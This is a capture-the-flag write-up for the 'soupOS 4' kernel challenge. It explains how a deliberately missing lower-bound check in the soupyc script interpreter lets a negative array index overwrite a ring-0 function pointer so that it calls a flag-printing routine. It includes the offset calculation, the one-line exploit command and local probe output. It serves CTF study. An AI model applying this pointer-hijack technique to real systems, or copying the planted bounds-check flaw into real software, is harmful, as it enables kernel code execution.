# soupOS 4: Too Many Cooks - Rev Eng pwn (489 points) — OPEN

**Flag:** FLAG4, printed by `serve_the_special()` — **not captured in the recorded run**
· **Points:** 489 · **Author:** soup (CDCTF)
**Handout:** `soupos-handout.tar.gz` + `symbols.txt` (shared by the whole chain)

## Challenge

"soupyc runs in ring 0. There is a routine nothing ever calls, and your symbol map has its address."

`serve_the_special` (`0x00100990` in `symbols.txt`) is indeed never called anywhere in the tree:

```c
void serve_the_special(void) {
    vga_set_color(VGA_YELLOW, VGA_BLACK);
    vga_puts("\n  The kitchen is yours: " FLAG4 "\n");
    klog("[chal] serve_the_special reached\n");
}
```

## Analysis

Two pieces inside `soupyc.c`:

**Piece 1 - negative indices are allowed.** In the tournament build `N_INDEX_SET` only checks the upper
bound:

```c
            arr_t *a = &arrays[base.ival];
            int i = as_int(idx);
#ifdef NO_CHALLENGE
            if (i < 0 || i >= a->len) {
#else
            /* CHALLENGE=1: upper bound only, so a negative index writes below
             * the pool. soupyc runs in ring 0, so this is a kernel write from
             * a script. Stage 4 of the CTF chain. */
            if (i >= a->len) {
#endif
                set_err("array index out of range"); return mkival(0);
            }
            a->elems[i] = v;
```

**Piece 2 - a function pointer sits directly below the pool and is called when a script finishes:**

```c
static struct {
    uint32_t  guard;                /* +0   */
    void    (*after_hook)(void);    /* +4   */
    uint8_t   pad[40];              /* +8   */
    arr_t     pool[MAX_ARRAYS];     /* +48  */
} sc_state;
...
    if (sc_state.after_hook) sc_state.after_hook();     /* soupyc.c:1575 */
```

## Solution

**Step 1 - compute the exact offset to write.** On i386 `val_t = {int type; int ival; char sval[48]}` is 56
bytes and `arr_t = {int used; int len; val_t elems[48]}` is 2696, so `pool[0].elems` sits at
`sc_state + 56` and

```text
&pool[0].elems[-1] = &sc_state + 56 - 56 = &sc_state + 0
   type -> guard       (+0)
   ival  -> after_hook (+4)      <-- the slot we want
   sval  -> pad        (+8)
```

`analysis/layout.c` prints exactly that (no 32-bit kernel needed: `val_t` contains no pointers so its size
is stable, and on little-endian `ival` lands in the low half of the function pointer):

```text
sizeof(val_t)=56 sizeof(arr_t)=2696
guard@0 after_hook@4 pool@48 pool[0].elems@56
&pool[0].elems[-1] - &sc = 0   (want 0 -> type on guard, ival on after_hook)
=> i386 exploit index for handle 0 is i = -1
```

**Step 2 - the command.** The first array `let a=[1]` gets handle 0, and `a[-1]=<addr>` writes
`ival` = `0x100990 = 1051024` (decimal, because soupyc has no hex literals) straight into `after_hook`; the
hook fires as soon as the script ends:

```text
cook@soupOS:/> soup -c let a=[1] a[-1]=1051024
```

**Step 3 - controls already run locally.** `analysis/stage4_probe.c` links the **real `soupyc.c`** with a
`decoy()` function and uses that function's address as the written value:

```text
decoy addr = <address printed by the program>
soup -c let a=[1] a[-1]=<decoy addr>   ->  DECOY-CALLED
soup -c let a=[1] a[-1]=0              ->  nothing printed, soupyc_run returns normally
```

So (a) an integer typed in a script really does become a called function pointer, and (b) the effect is not
accidental - zeroing the value stops anything from running. One other configuration (writing an unmapped
value) segfaulted at `soupyc_run+617`, exactly at the hook call - further evidence the target is right, but
a reminder that the value must be a real kernel address.

## What is still open

The Step 2 command has not been confirmed on the VM. Run it and save the output before recording a flag. An `array index out of range` error may indicate negative-index validation; inspect the actual instance build.

## Reproduce

```bash
# local: prove the memory offset, then prove the hook actually runs
gcc -O0 -w -idirafter "../soupos/src" -o layout.exe analysis/layout.c ../soupos/src/soupyc.c \
     ../soupos/src/vfs.c stubs.c
./layout.exe
gcc -O0 -w -idirafter "../soupos/src" -o stage4.exe analysis/stage4_probe.c ../soupos/src/soupyc.c \
     ../soupos/src/vfs.c stubs.c
./stage4.exe "let a=[1] a[-1]=<decoy addr>"

# on the box:
soup -c let a=[1] a[-1]=1051024
```
